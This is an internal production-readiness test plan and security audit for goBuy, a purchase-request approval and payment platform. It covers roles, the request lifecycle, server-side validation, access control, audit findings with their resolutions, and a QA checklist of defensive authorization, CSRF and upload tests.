# goBuy — Production Readiness Test Plan

Generated 2026-07-01.
Scope: every feature in the current codebase, grounded in the actual RPC/RLS/schema logic on Supabase project `jfdqlnpidynxwqqiblcd` (schema `finance`), not assumptions.
Expected production load: ~100 purchase requests/hour platform-wide, per the request that produced this document.

## 1. How to read this document

Section 2 explains what the app does and how its permission model works — read this first if you're not deep in the code.
Section 3 is the feature inventory.
Section 5 is the most actionable part: concrete issues found while auditing the code and database for this plan, ranked by severity.
Section 8 is the test case checklist — the actual work items for QA.
Section 9 addresses the 100/hour volume question directly.

## 2. System overview

goBuy is Vammo's internal purchase-request → approval → payment platform.
A requester creates a request (products, a service contract, or a cash advance), one or more cost-center heads approve it, the requester or Finance attaches payment details, Finance validates and pays it.
Every write to financial data goes through a Postgres `SECURITY DEFINER` RPC that re-checks authorization itself — the Next.js API routes are thin wrappers, not the authority.
This matters for testing: a bug in the RPC is a real bug even if the UI hides the button, and a bug in the UI that merely hides a button is not a security bug as long as the RPC still blocks it.

### 2.1 Roles — how they're actually determined

| Role | Source of truth | Grants |
|---|---|---|
| Requester | everyone with an `@vammo.com` Google account | create/view own requests, cancel own pending requests |
| Cost-center head | row in `finance.cost_center_heads` (per cost center, many-to-many) | approve/reject requests allocated to their center(s), override that center's budget |
| `finance` (app_role) | row in `finance.user_roles` | Finance dashboard with pay actions, validate payment info, mark paid, export XLSX, manage all budgets |
| `fiscal` (app_role) | row in `finance.user_roles` | Finance dashboard read-only (no pay button), CSV export, view budgets |
| `admin` (app_role) | row in `finance.user_roles` | **same as `finance`** for dashboard access — this role does *not* grant access to the `/admin` page |
| Super-admin | **one hardcoded email**, `gabriel.beltrami@vammo.com` | the only account that can reach `/admin`: manage roles, manage heads, bulk-import cost centers, delete test data |

The `admin` app_role and "super-admin" are two unrelated things that share a confusing name — this is flagged in Section 5.

### 2.2 Request lifecycle (the real state machine, read from the RPCs)

```
pending ──approve_purchase_request──▶ approved ──submit_payment_info──▶ awaiting_finance ──finance_confirm_payment_info──▶ awaiting_payment ──mark_purchase_request_paid──▶ paid
   │                                     │                                                                                        ▲
   │                                     └──────────────────────── mark_purchase_request_paid (direct pay, skips finance step) ────┘
   ├──reject_purchase_request──▶ rejected   (terminal)
   └──cancel_purchase_request──▶ cancelled  (terminal)
```

| Transition | RPC | Who can call it | Precondition enforced server-side |
|---|---|---|---|
| (create) → `pending` | `submit_purchase_request` | any `@vammo.com` user | cost center active; totals/items/allocations valid (see 2.3) |
| `pending` → `approved` | `approve_purchase_request` | head of ≥1 allocation cost center | **all** allocation heads must approve (see below) |
| `pending` → (stays `pending`, logs `partial_approval`) | `approve_purchase_request` | one head of a multi-department split | other allocation(s) still unapproved |
| `pending` → `rejected` | `reject_purchase_request` | head of ≥1 allocation cost center | non-empty reason, ≤2000 chars — **any one head can reject regardless of other heads' prior approvals** |
| `pending` → `cancelled` | `cancel_purchase_request` | requester only | — |
| `approved` → `awaiting_finance` | `submit_payment_info` | requester, `finance`, `admin` | method-specific fields + required documents already uploaded |
| `approved` → `paid` | `mark_purchase_request_paid` | **`finance` role only** | direct-pay shortcut, skips the finance-confirm step entirely |
| `awaiting_finance` → `awaiting_payment` | `finance_confirm_payment_info` | `finance`, `admin` | payment_type from a fixed 9-value list |
| `awaiting_payment` → `paid` | `mark_purchase_request_paid` | **`finance` role only** | — |

**Multi-department split ("rateio") approval is per-allocation, not per-request.** Every request always has at least one row in `request_allocations` (a single-CC request gets exactly one row at 100%, inserted automatically). Each cost-center head only approves their own slice; the request only flips to `approved` once every allocation has `approved_at` set. This is enforced with `SELECT ... FOR UPDATE` row locking, so concurrent approvals from different heads on the same request serialize correctly and cannot double-flip the status — verified by reading `approve_purchase_request` directly.

### 2.3 Server-side validation actually enforced by `submit_purchase_request`

- `supplier_name` required, ≤200 chars.
- `justification`/`notes` ≤4000 chars each.
- `currency` must match `^[A-Z]{2,10}$` (default `BRL`).
- `cost_center_id` must reference an **active** cost center.
- If `allocations` provided: max 20 rows, each 0–100%, each referencing an active cost center, sum must be within 0.01 of 100 — duplicate cost-center rows are merged (percentages summed), not rejected.
- If `request_type = "products"`: ≥1 item required (max 100), each item needs a description, `quantity > 0`, `unit_value >= 0`; **total is recomputed server-side from the line items** — the client's total is not trusted.
- If `request_type = "service"` or `"advance"`: **total_amount is taken directly from the client payload**, with no line items to cross-check it against.
- Final total must be `> 0` and `<= 10,000,000` (any currency, no FX conversion applied to this cap).

## 3. Feature inventory

| # | Feature | Purpose | Who |
|---|---|---|---|
| 1 | Google OAuth login | Single sign-on, restricted to `@vammo.com` | everyone |
| 2 | Session/middleware gating | Blocks unauthenticated access to every page and API route except login/Slack webhook | everyone |
| 3 | Role-based nav tabs | Shows only the sections a user can act on | everyone |
| 4 | "Minhas solicitações" dashboard | Requester's own request list, filters, status summary cards | requesters |
| 5 | Create request modal | Submit a products/service/advance request, optional department split, optional pre-approval documents | requesters |
| 6 | Request detail drawer | Shared view/action surface: cancel, approve/reject, submit payment info, finance-confirm, upload/download docs, event timeline | everyone with view rights |
| 7 | Head approvals dashboard | Pending queue, budget-vs-committed by cost center, aggregate chart, recent decisions | heads |
| 8 | Budget donut / detail modal | Per-cost-center budget visualization and drill-down | heads |
| 9 | Finance dashboard | Awaiting-validation and awaiting-payment queues, mark-as-paid, full searchable table | finance, fiscal |
| 10 | Export to XLSX / CSV | Downloadable payment run for accounting | finance (XLSX), fiscal (CSV) |
| 11 | Admin — role management | Grant/revoke `finance`/`fiscal`/`admin` | super-admin only |
| 12 | Admin — head management | Bind emails to cost centers | super-admin only |
| 13 | Admin — bulk cost-center import | Upload `.xlsx` to create/update cost centers + heads | super-admin only |
| 14 | Admin — test-data cleanup | Permanently delete a request and its documents | super-admin only |
| 15 | Document upload/download | Attach/retrieve quotations, NF, boletos, etc., gated by request status | everyone with view rights |
| 16 | Slack one-click approval | Approve/reject from a Slack DM | heads (currently test-mode only) |
| 17 | FX/theme toggles | Cosmetic ambient background + dark/light mode | everyone |
| 18 | Recurring-service renewal prompt | After a recurring (`Mensal`/`Trimestral`/`Anual`) service request is approved, the requester gets a "renew for next period?" Slack prompt; clicking it clones the original request with shifted dates | requesters, currently reachable only through the Slack path (test-mode, see Finding P0-2) |

## 4. Access-control matrix

Every row below was confirmed by reading the RPC/RLS/route source directly, not inferred from the UI.

| Action | Enforced by | Allowed | Explicitly blocked |
|---|---|---|---|
| Create request | RPC | any `@vammo.com` user | non-`@vammo.com`, inactive cost center |
| Cancel request | RPC | requester, status=pending | anyone else, any other status |
| Approve/reject | RPC | head of ≥1 allocation CC, status=pending | non-heads, non-pending status |
| Submit payment info | RPC | requester, `finance`, `admin`, status=approved | other users, other statuses |
| Confirm payment info | RPC | `finance`, `admin`, status=awaiting_finance | `fiscal`, other statuses |
| Mark paid | RPC | **`finance` only**, status ∈ {approved, awaiting_payment} | `admin` (!), `fiscal`, other statuses |
| Set CC budget (override) | RPC | head-of-that-CC, `finance`, `admin` | other heads, non-finance/admin |
| Upsert CC budget (bulk) | RPC | `finance`, `admin` | everyone else — **no upper-bound check** |
| View request | RLS on table | requester, head-of-CC, `finance`, `fiscal`, `admin` | everyone else (silently returns no row) |
| Upload/download document | route + RLS | anyone who can view the request; doc type gated by status | cancelled/rejected requests (no uploads); wrong doc type for lifecycle stage |
| `/api/admin/*` (roles, heads, import, cleanup) | route (hardcoded check) | **one literal email address** | every other account, including `admin`-role users |
| `/api/export` (XLSX) | route | `finance`, `admin` | `fiscal`, requesters, heads |
| CSV export | client-side only | anyone who can open the finance dashboard (`finance`, `fiscal`) | — not RLS-enforced, relies on page-level access |
| Slack interaction | HMAC signature + hardcoded email map | one test Slack user | everyone else (silently no-ops) |

## 5. Findings from this audit — fix or explicitly accept before launch

These were discovered while reading the actual code and database for this plan, not hypothetical.
Each should get an owner decision: fix it, or write down that it's an accepted risk.

### Resolution status (updated 2026-07-01)

Owner decisions were taken and applied. Summary:

| Finding | Decision | Status |
|---|---|---|
| P0-1 admin gate | Accepted (leave as is) | Moot — all `/api/admin/*` routes and the `/admin` page now gate on the `admin` DB role (`has_role('admin')`); the hardcoded super-admin email was removed. No single-email dependency remains. |
| P0-2 Slack test-mode | Accepted (leave as is) | Unchanged — still hardcoded to one test user; treat Slack one-click as not launched. |
| P0-3 `mark_paid` excludes admin | Accepted (leave as is) | Unchanged — finance-only by design. |
| P0-4 no rate limiting | Accepted (leave as is) | Unchanged. |
| P0-5 `upsert_cost_center_budget` no cap | Accepted (leave as is) | Unchanged. |
| P0-6 10-year export URLs | Accepted (leave as is) | Unchanged. |
| P0-7 admin error leaks | **Fix — sanitize** | Done. `roles`/`heads`/`cleanup`/`import` now log `error.message` server-side and return generic Portuguese messages. |
| P1-8 R$5,000 advance copy | **Remove the warning** | Done. Replaced with an accurate "prestação de contas até o prazo" note. |
| P1-9 client-trusted service/advance total | Accepted (sufficient) | Human review at approval is the control. |
| P1-10 one head can veto | Accepted (one veto wins) | Documented as intended policy. |
| P1-11 double-approve duplicate event | **Implement the guard** | Done. UI: synchronous `busyRef` on all mutating drawer actions. DB: `approve_purchase_request` migration adds a `ROW_COUNT` guard so a re-click emits no duplicate `partial_approval`. **Migration written to `supabase/migrations/` but NOT yet applied to prod — apply to activate the server-side half.** |
| P1-12 list caps / no pagination | **Paginate, 20/page** | Done. Requester table, finance all-requests table, head pending queue, and head recent all paginate at 20/page via a shared `usePagination`/`Pagination`. (Finance work-queues left unpaginated — see note.) |
| P1-13 import partial-commit + cleanup orphans | **Fixed (see below)** | Done. Cleanup now checks the storage-removal result and surfaces orphaned files as a `warning`. Import: errors sanitized + a clear idempotent-retry message; a transactional `import_cost_centers` RPC migration is provided as the atomic upgrade (**written but not applied**). |
| P2-14 native confirm/prompt | **Do all** | Done. New `ConfirmDialog` replaces the drawer cancel, finance mark-paid (with reference input), and admin delete dialogs. |
| P2-15 silent date-filter failures | **Do all** | Done. Shared `maskDMY`/`parseDMY` with overflow rejection; complete-but-invalid dates get a red border, `aria-invalid`, and a "Data inválida" hint. |
| P2-16 best-effort upload no retry | **Do all** | Done. After a request is created, failed document uploads are kept and retried against the existing request (no duplicate request); a "Concluir mesmo assim" path remains. |

**Two DB migrations must be applied before their server-side guarantees take effect** (they were blocked from auto-applying to the shared production database): `supabase/migrations/20260701000001_approve_request_partial_guard.sql` and `20260701000002_import_cost_centers_rpc.sql`. The app runs correctly with or without them; applying them adds the server-side duplicate-event guard and atomic import. To wire the atomic import in, switch `/api/admin/import`'s confirm branch to call the `import_cost_centers` RPC (via the user token) after the migration lands.

### P0 — should be resolved or explicitly signed off before go-live

1. **Admin access is a single hardcoded email**, checked independently in four API routes and the `/admin` page (`gabriel.beltrami@vammo.com`), with no relationship to the `admin` app_role that already exists in the roles table.
   If that account is disabled, offboarded, or just unavailable, nobody can manage roles, heads, bulk imports, or test-data cleanup.
   Recommend gating on `has_role('admin')` (or that role plus the hardcoded email as a bootstrap fallback) before launch.

2. **Slack notifications and Slack-button actions are hardcoded to one test user.** `lib/slack.ts` sends every notification to a single Slack user ID and resolves button-click actors from a one-entry email map.
   As shipped, either every head/requester's notifications land in one test person's DMs, or (once that mapping is removed) Slack actions silently no-op for anyone not in the map.
   Treat Slack one-click approval as **not launched** until real per-user Slack ID lookup replaces this.

3. **`mark_purchase_request_paid` excludes `admin`** (checks `has_role('finance')` only), while `finance_confirm_payment_info` allows `finance` OR `admin`.
   Confirm whether this asymmetry is intentional — if the only `finance`-role person is out, an `admin` currently cannot mark anything paid.

4. **No rate limiting anywhere** — not in middleware, not per-route, not in `next.config.ts`.
   Irrelevant to the 100/hour *expected* load, but `/api/documents` (25MB uploads), `/api/export` (in-memory workbook), and the public `/api/slack/interact` endpoint have no throttling against misuse or a buggy retry loop.

5. **`upsert_cost_center_budget` has no upper-bound check**, unlike `set_cost_center_budget`'s explicit 1-billion cap. A budget set through this path can be an arbitrary size and will silently skew every donut/chart that divides spend by budget.

6. **Export XLSX embeds 10-year signed URLs** to NF/boleto documents. Intentional per an in-code comment, but confirm it's an accepted risk: once the spreadsheet leaves the app, those document links work for anyone who has the file, indefinitely, with no revocation short of deleting the storage object.

7. **Admin routes leak raw Postgres error messages** to the client on failure (`admin/roles`, `admin/heads`, `admin/cleanup`). Low severity given admin-only access, but easy to sanitize.

### P1 — confirm intent, may be fine as-is

8. The new-request modal's "adiantamentos acima de R$5.000 passam por validação adicional" text is **UI copy only** — no RPC (`submit_purchase_request`, `submit_payment_info`, `finance_confirm_payment_info`) enforces a monetary threshold for advances. Confirm with Finance whether this needs to be a real gate.

9. For `service` and `advance` requests, `total_amount` is trusted directly from the client with no line-item backing (unlike `products`, where the server recomputes the total). The control here is human review at approval time, not server validation — confirm that's sufficient.

10. **Any single cost-center head can unilaterally reject a multi-department request**, even after other heads have already approved their own slice. The already-approved allocation rows keep their `approved_at` timestamp with no compensating event — confirm "one veto wins" is the intended policy.

11. Double-clicking Approve produces a **harmless duplicate `partial_approval` event** in the audit timeline (the second call's allocation UPDATE affects zero rows, but the event insert isn't guarded the same way). Cosmetic, but worth a UI-level double-submit guard.

12. List views handle scale inconsistently: finance dashboard caps at 1000 rows, head dashboard at 500, recent-decisions widget at 12 — all silent truncations with no "there's more" indicator. The requester's own dashboard has the **opposite** problem: no cap/pagination at all, so a long-tenured heavy requester's query grows unbounded over time. Neither extreme is a problem at 100/hour for a long while, but both should eventually move to real pagination.

13. `/api/admin/import` (confirm step) can commit cost centers, then fail linking heads, leaving the two out of sync with no automatic rollback. `/api/admin/cleanup` removes storage files best-effort/unchecked — a failure there leaves orphaned files with no surfaced error.

### P2 — polish

14. Native `window.confirm`/`window.prompt` dialogs (cancel request, delete test request, mark-paid payment reference) are inconsistent with the rest of the styled UI and need special handling in any E2E framework.

15. The hand-rolled dd/mm/yyyy date-range filter (used on three dashboards) fails silently on malformed input instead of showing a validation message.

16. Document upload at request-creation time is best-effort — if a file fails to upload after the request itself is created, the user gets a toast and must manually retry from the drawer; there's no automatic retry.

## 6. Failure-mode catalog

| Feature | Failure mode | Likely trigger | Test approach |
|---|---|---|---|
| Create request | Silent data-integrity gap: client-supplied total accepted unchecked for service/advance | malicious or buggy client sends a total unrelated to reality | submit a service/advance request with an absurd total, confirm it's visible to the approving head so human review is the real control |
| Create request | Allocation math edge cases | percentages summing to 99.99%, 100.01%, duplicate cost centers, >20 rows | boundary-test each RPC validation branch directly (see 2.3) |
| Create request | Enum/cast failures surface as generic 400s | invalid `request_type`, malformed date strings, non-numeric `cost_center_id` | fuzz the RPC payload directly via `supabase.rpc`, confirm a clean 400 reaches the user rather than a 500 |
| Approve/reject | Race condition on concurrent decisions | two heads (or one head double-clicking) act on the same request near-simultaneously | concurrent RPC calls against the same `request_id`, assert final state is consistent and no duplicate `approved`/`rejected` events land |
| Approve/reject | Authorization bypass attempt | a non-head calls `approve_purchase_request` directly via REST with a valid but unauthorized JWT | call the RPC directly (bypassing the UI) as a requester/other-head, expect the RPC's own exception, not just a hidden button |
| Payment info submission | Required-document gate can be circumvented | boleto/pix/transfer submitted without the matching document/field | submit payment info with each method missing its required field/document, expect a clean RPC rejection |
| Finance confirm / mark paid | Status-guard bypass | calling `mark_purchase_request_paid` on a `pending` or `rejected` request | call each payment RPC against every wrong status, expect rejection |
| Document upload | Oversized/wrong-type file accepted | client bypasses the `accept=""` filter and posts a `.exe` or 30MB file directly to `/api/documents` | POST directly with a disallowed MIME type and with a file just over 25MB, confirm server-side rejection (the accept filter is client-side only) |
| Document upload | Upload succeeds but DB insert fails | forced DB error after storage write | confirm the compensating storage-delete actually runs (code claims it does) — verify with a fault-injection test if feasible, otherwise a manual check |
| Document download | Signed URL leaks beyond intended viewer | user without view rights requests `/api/documents/[id]` for someone else's request | call the route as an unrelated `@vammo.com` user, expect 404 (RLS-hidden), not the file |
| Export XLSX | Timeout/memory pressure on a large payment run | many months of `awaiting_payment` rows accumulate before this feature is exercised | seed a few hundred rows across several months, run the export, confirm it completes within Vercel's default function timeout |
| Admin — bulk import | Partial commit on failure | cost centers import successfully, head-linking then fails | force a failure between the two upsert steps (bad head email set), confirm the resulting state is inspected/fixed manually — document this as a known gap, not a "test until green" item |
| Admin — cleanup | Orphaned storage files | storage delete fails silently, DB row still gets deleted | delete a request with attached documents, then check the bucket for leftover files |
| Slack integration | Notifications/actions silently go nowhere for real users | any user other than the hardcoded test Slack user tries to act | confirmed by design read — treat as **out of scope for production test coverage** until the hardcoded mapping is replaced |
| Auth | Non-`@vammo.com` account reaches the app | user signs in with a personal Gmail account | attempt Google sign-in with a non-Vammo account, expect rejection at the `signIn` callback, never reaching a session |
| Auth | Session/JWT expiry mid-action | Supabase JWT (8h TTL, refreshed after 7h) expires while a form is open | leave a tab open past the refresh window, attempt a write, confirm a clean re-auth prompt rather than a confusing RPC error |
| Budgets | Head sees/edits another department's budget | RLS or RPC authorization gap | attempt `set_cost_center_budget` for a CC the caller doesn't head, expect rejection; attempt to view another CC's budget via the table, expect RLS to hide it |

## 7. Test strategy by layer

Given there is currently **no test tooling installed** (`package.json` has no Jest/Vitest/Playwright), recommend introducing exactly these four layers — no more, calibrated to an internal tool handling real money, not a public product needing exhaustive automation:

1. **Database/RPC tests (highest value, cheapest to write).** These RPCs *are* the business logic — test them directly with SQL, independent of the UI. Use either:
   - Supabase CLI local stack + `pgTAP`, or
   - a plain Node/TS script using `@supabase/supabase-js` against a disposable test project/branch, calling each RPC with crafted payloads and asserting on the returned error or resulting row.
   Cover every validation branch listed in Section 2.3 and every access-control row in Section 4.

2. **API route tests (integration).** Next.js route handlers can be tested by running the dev server and hitting them with `fetch`, or via Next's route testing utilities. Cover: CSRF rejection (missing/foreign `Origin`), auth rejection, malformed JSON, and the happy path for each of the 11 routes in Section 3 of the earlier audit (create, decide, payment-info, documents ×2, export, admin ×4, slack).

3. **End-to-end tests (Playwright).** Cover the full lifecycle once per request type: create (products/service/advance) → approve → submit payment info → finance-confirm → mark paid, plus reject and cancel branches. This is the only layer that exercises real browser behavior (file input, `window.confirm`/`window.prompt`, OAuth redirect). For OAuth in CI, either mock the NextAuth session cookie directly or use a dedicated test Google account.

4. **Manual/exploratory QA.** Per workspace convention, be picky about visual correctness and test the golden path plus edges in a real browser before sign-off. This is also where you exercise things automation struggles with: the native browser dialogs, Slack DM appearance (once real Slack routing exists), dark/light mode, and the FX ambient background toggle.

Security-specific: run the `security-review` skill (already installed at the workspace root) against the diff before launch, and separately attempt every row in Section 4's "explicitly blocked" column by calling RPCs/routes directly rather than through the UI.

## 8. Detailed test case checklist

Priority key: **P0** = must pass before launch, **P1** = should pass, **P2** = nice to have.

### 8.1 Auth & session (P0)

- [ ] Sign in with an `@vammo.com` Google account → lands on `/`, session persists across reload.
- [ ] Sign in with a non-`@vammo.com` Google account → rejected before a session is created, clear error on `/login`.
- [ ] Visit any `/api/*` route while logged out → JSON 401, not a redirect.
- [ ] Visit any page while logged out → redirect to `/login`.
- [ ] Visit `/login` while already logged in → redirect to `/`.
- [ ] Sign out → session cleared, redirected to `/login`, back-button doesn't restore access.
- [ ] Session held open past the 8h Supabase-JWT TTL → next write attempt either silently refreshes or prompts a clean re-login, never a confusing RPC error.

### 8.2 Create request (P0/P1)

- [ ] Products request: valid single item → submitted, total = qty × unit_value, status `pending`.
- [ ] Products request: multiple items, mixed units → total is the sum of line totals, matches server-recomputed total.
- [ ] Products request: 0 items with description → blocked client-side; direct RPC call with empty items array → server rejects.
- [ ] Products request: 101 items → server rejects ("too many items").
- [ ] Service request: total taken as entered, no line items required.
- [ ] Advance request: total taken as entered; confirm whether the ">R$5,000 extra validation" copy is enforced anywhere (Finding P1-8) — if not fixed, document as known gap.
- [ ] Missing supplier/beneficiary name → client-side error; direct RPC call with blank name → server rejects.
- [ ] Inactive cost center selected (only reachable via direct RPC call, since the UI list should already exclude inactive ones) → server rejects.
- [ ] Custom currency code: valid 2–10 letter code accepted; lowercase/invalid pattern rejected client-side and server-side.
- [ ] Total exactly `10,000,000` → accepted; `10,000,000.01` → rejected.
- [ ] Department split ("rateio") with 2 rows summing to exactly 100% → accepted.
- [ ] Rateio summing to 99.98% or 100.02% → rejected; summing to 100.01% (within the 0.01 tolerance) → accepted.
- [ ] Rateio with 21+ rows → rejected.
- [ ] Rateio with a duplicate cost center across two rows whose percentages still sum to 100% → accepted, collapses to one allocation row (verify via the head dashboard, not just the 201 response).
- [ ] Attach a quotation/contract at creation time → visible immediately in the drawer.
- [ ] Attach a disallowed doc type (e.g. `nota_fiscal`) at creation time → not offered in the picker; confirm the server also rejects it if called directly (status is `pending`, only pre-approval doc types allowed).
- [ ] Simulate a failed document upload after the request is created (e.g. throttle network mid-upload) → request still exists, user sees the "documento não anexado" warning, can retry from the drawer.
- [ ] Double-click "Enviar solicitação" rapidly → exactly one request is created, not two.

### 8.3 Approve / reject / cancel (P0)

- [ ] Head approves a single-CC request → status flips to `approved` immediately, one `approved` event.
- [ ] Head A approves their slice of a 2-department split → status stays `pending`, `partial_approval` event logged, head B still sees it in their queue.
- [ ] Head B then approves their slice → status flips to `approved`, one `approved` event.
- [ ] Head rejects a request with a reason → status `rejected`, reason stored and visible in the timeline.
- [ ] Attempt to reject with an empty reason → blocked client-side; direct RPC call with empty reason → server rejects.
- [ ] Head A approves their slice, then head B rejects → overall status `rejected` even though head A already signed off (Finding P1-10) — confirm this matches intended policy, and that the drawer doesn't show a misleading "approved by A" state on a rejected request.
- [ ] Non-head calls `approve_purchase_request`/`reject_purchase_request` directly (bypassing the UI) for a request they don't head → server exception, not a 200.
- [ ] Head attempts to approve a request that's already `approved`/`rejected`/`cancelled` → server exception ("only pending requests can be approved").
- [ ] Requester cancels their own `pending` request → status `cancelled`.
- [ ] Requester attempts to cancel a request that's no longer `pending` → server exception.
- [ ] Non-requester attempts to cancel someone else's request (direct RPC call) → server exception.
- [ ] Two heads click Approve on their respective allocations within the same second → both approvals register correctly, final status is `approved`, no lost update (this is the concurrency case the `FOR UPDATE` lock is meant to prevent — see Section 9).
- [ ] Same head double-clicks Approve → status transitions correctly once; confirm whether a duplicate `partial_approval` event appears (Finding P1-11) and decide if that needs a UI-level guard before launch.

### 8.4 Payment info → finance confirm → mark paid (P0)

- [ ] Requester submits payment info on their own `approved` request with method `pix` and a key → status `awaiting_finance`.
- [ ] Submit `pix` without a key → server rejects.
- [ ] Submit `transfer` missing any of bank/agency/account → server rejects.
- [ ] Submit `boleto` without a `boleto`-type document already uploaded → server rejects.
- [ ] Submit for a non-`advance` request without an `nota_fiscal` document already uploaded → server rejects.
- [ ] Submit payment info on a request that isn't `approved` → server rejects.
- [ ] Non-requester, non-finance/admin user attempts to submit payment info → server rejects.
- [ ] Finance confirms payment info → status `awaiting_payment`, `payment_type` and `expected_payment_date` set.
- [ ] Fiscal attempts to confirm payment info → server rejects (fiscal is read-only).
- [ ] Finance marks an `awaiting_payment` request as paid, with and without an optional payment reference → status `paid`.
- [ ] Finance marks an `approved` request as paid directly (skipping the finance-confirm step) → status `paid`.
- [ ] Admin (not finance) attempts to mark a request as paid → server rejects (Finding P0-3) — confirm this is intended before launch.
- [ ] Fiscal attempts to mark a request as paid → server rejects, and no pay button is even rendered.
- [ ] Expected-payment-date preview (client-side estimate) matches the server-returned value across at least one case in each bucket: submitted Mon–Wed before 18:00 BRT, Thu–Fri before 18:00 BRT, after 18:00 BRT, and over a weekend.

### 8.5 Documents (P0/P1)

- [ ] Upload a valid PDF/PNG/JPEG under 25MB to a viewable, non-cancelled/rejected request → succeeds, appears in the list, `sha256` recorded.
- [ ] Upload a file over 25MB → rejected with a clear message.
- [ ] POST a disallowed MIME type (e.g. `.exe` renamed to `.pdf`, or a genuine `.docx`) directly to `/api/documents`, bypassing the browser's file picker filter → server rejects.
- [ ] Upload a doc type not allowed for the request's current status (e.g. `nota_fiscal` while still `pending`) → server rejects.
- [ ] Upload to a `cancelled` or `rejected` request → server rejects (no uploads allowed at all in these states).
- [ ] Download a document as the requester, the head, finance, and fiscal → all succeed (all have view rights).
- [ ] Download a document as an unrelated `@vammo.com` user → 404, not the file.
- [ ] Signed download URL expires after 60 seconds — confirm a stale link fails.
- [ ] Filename with unusual characters (accents, spaces, emoji) → sanitized correctly in the storage path, original name preserved for display.

### 8.6 Dashboards (P1)

- [ ] Requester dashboard shows only their own requests, confirmed by comparing against a second test account.
- [ ] Status summary cards filter the table correctly when clicked.
- [ ] Date-range filter with a malformed date (e.g. `31/02/2026`) → doesn't crash, though it may fail silently (Finding P2-15) — confirm the failure is graceful.
- [ ] Head dashboard scoped to only the heads' own cost centers; a request allocated partly to a CC they don't head still appears (their slice) without exposing the other CC's budget data.
- [ ] Budget donut renders a neutral "sem orçamento" state at budget=0 without a divide-by-zero glitch.
- [ ] Budget donut turns the over-budget color when committed spend exceeds budget.
- [ ] Finance dashboard: awaiting-validation and awaiting-payment queues match what's actually in those statuses.
- [ ] Fiscal sees the finance dashboard without a "marcar como pago" button anywhere, including via direct DOM inspection (not just visually).
- [ ] Export to XLSX and CSV both respect (or both ignore) the on-screen filters — confirm which, since this wasn't verified during the code audit, and document the actual behavior.
- [ ] Seed ~500 requests across several months, then load the finance dashboard and run an export — confirm no timeout and that the "1000 rows" and "500 rows" caps (Finding P1-12) don't silently hide recent data.

### 8.7 Admin (P0 for access control, P1 for functionality)

- [ ] Every `/admin` page and every `/api/admin/*` route is reachable only by the one hardcoded email — confirm with a second account that has the `admin` app_role but is not that email, and expect it to be blocked (this is the counterintuitive part of Finding P0-1, worth demonstrating explicitly to stakeholders).
- [ ] Grant/revoke `finance`/`fiscal`/`admin` role → takes effect on next session refresh, confirmed by testing dashboard access before/after.
- [ ] Add/remove a cost-center head → takes effect for approval routing.
- [ ] Bulk import: preview step shows non-`@vammo.com` head emails flagged and correctly predicts they'll be skipped.
- [ ] Bulk import: confirm step with a deliberately broken head-email row → cost centers still commit; confirm the resulting inconsistency is visible/fixable rather than silently lost (Finding P1-13).
- [ ] Test-data cleanup: delete a request with attached documents → request and DB rows gone; manually verify in the storage bucket whether the files were actually removed (Finding P1-13's flip side).
- [ ] Delete a request while another browser tab has its drawer open → the open tab handles the now-missing request gracefully (no crash) on its next action.

### 8.8 Cross-cutting security (P0)

- [ ] Attempt every "explicitly blocked" cell in Section 4's matrix via direct RPC/REST calls, not just hidden UI — this is the actual security boundary.
- [ ] Confirm no table in `finance` schema grants `INSERT`/`UPDATE`/`DELETE` to `authenticated` directly (only `SELECT`, plus `user_profiles` self-service) — re-run `information_schema.table_privileges` after any migration to catch regressions.
- [ ] Confirm RLS is still enabled on every `finance` table after any migration (`pg_tables`/dashboard check).
- [ ] CSRF: POST to `/api/requests`, `/api/requests/[id]/decide`, `/api/requests/[id]/payment-info` with a forged `Origin` header → rejected.
- [ ] CSRF: GET `/api/export` with `Sec-Fetch-Site: cross-site` → rejected.
- [ ] `/api/slack/interact` with a missing, expired (>300s), or tampered HMAC signature → rejected.
- [ ] Attempt to reuse an old, valid Slack signature after 300 seconds → rejected (replay protection).

### 8.9 Slack integration & recurring renewal (blocked on Finding P0-2)

Do not invest in full test coverage here until the hardcoded single-user routing (`lib/slack.ts`) is replaced with real per-user Slack ID lookup — testing against the test-mode version would only validate a configuration that can't ship. Once real routing lands, add:

- [ ] Approve/reject/renew buttons in a real head's/requester's own Slack DM (not the hardcoded test account) trigger the correct RPC as that actual user.
- [ ] Double-clicking a Slack action button before the message updates → second click either no-ops cleanly (RPC's own status guard rejects it) or is deduplicated at the route level; confirm no duplicate event/side effect.
- [ ] Reject modal enforces its 5-character minimum reason both in Slack's modal validation and, redundantly, in the RPC itself.
- [ ] Approving a recurring (`Mensal`/`Trimestral`/`Anual`) service request triggers the renewal prompt; a one-off (`Pontual / avulso`) approval does not.
- [ ] Clicking "Renew" clones the original request with correctly shifted service dates for the next period, as a brand-new `pending` request — confirm it does not mutate the original (paid/approved) request in any way.
- [ ] Renewal prompt message is edited in place after being acted on, same as the approve/reject head message, so a stale prompt can't be actioned twice.

Until Finding P0-2 is resolved, these should be run against a staging Slack workspace only, never production.

## 9. Concurrency and volume testing at 100 requests/hour

100 requests/hour is roughly one every 36 seconds on average — trivial throughput for a Next.js/Vercel + Supabase stack, and classic load-testing tools (k6, Locust) at high request rates would be testing a scenario this app will never see.
What's actually worth testing at this scale is **burst tolerance and correctness under concurrency**, not raw throughput.

1. **Realistic bursts, not sustained load.** The real risk isn't "100/hour" evenly spread — it's everyone submitting expense requests Monday morning, or a month-end rush of approvals. Simulate 15–20 concurrent request submissions within a 10-second window and confirm no errors, no dropped notifications beyond the already-accepted best-effort Slack path, and reasonable latency.

2. **Row-lock correctness, already designed for this.** Every mutating RPC (`approve_purchase_request`, `reject_purchase_request`, `cancel_purchase_request`, `mark_purchase_request_paid`, `submit_payment_info`, `finance_confirm_payment_info`) takes `SELECT ... FOR UPDATE` on the request row before acting, so concurrent actions on the *same* request serialize safely at the database level. Verify this empirically rather than trusting the read: fire two concurrent approval calls for different allocations on the same multi-department request and confirm the final state is correct with no lost update (test case in 8.3).

3. **Shared Supabase project.** This Postgres instance is shared with other Vammo apps (per workspace convention, other tools live in the same project under different schemas). Confirm goBuy's connection usage (via the pooler) has headroom alongside whatever else is running, and that a spike in one app can't starve goBuy's connections. This is an infra coordination check, not something to script as a "test."

4. **The one route that could genuinely feel volume: `/api/export`.** It buffers an entire XLSX workbook in memory and batches signed-URL generation, with no `maxDuration` override and no streaming. This is a *data volume* concern (how many historical `awaiting_payment` rows exist) rather than a *request rate* concern. Seed a few hundred to a thousand rows across several months and confirm the export completes comfortably inside Vercel's default function timeout before this table grows large in production.

